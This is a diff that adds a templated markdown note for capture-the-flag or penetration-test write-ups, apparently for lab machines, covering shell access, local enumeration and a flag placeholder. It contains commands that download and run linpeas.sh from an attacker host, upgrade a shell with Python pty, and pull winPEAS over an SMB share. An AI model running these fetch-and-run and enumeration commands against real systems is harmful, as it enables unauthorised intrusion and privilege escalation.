@@ -1,0 +1,44 @@
+# Shell
+#shell #flag #LocalEnumeration
+
+## Local Enumeration
+{% if os == "Linux"%}
+I ran the following commands to enumerate the system:
+```bash
+cd /tmp
+wget http://{{ kali_ip }}:8000/linpeas.sh
+bash linpeas.sh | tee enum.txt
+```
+
+### Linux
+#### Python pty 
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+# ------
+stty raw -echo
+fg
+export SHELL=bash
+export TERM=xterm-256color
+reset
+```
+
+{% else %}
+```bash
+impacket-smbserver share ~/Documents/tools/
+cd C:\Users\Public\Documents
+copy \\{{ kali_ip }}\share\winPEASx64.exe winPEASx64.exe
+```
+{% endif %}
+
+
+# Privesc
+
+
+## Flag
+```bash
+cat proof.txt	
+XXX
+```
+
+- Flag : XXX
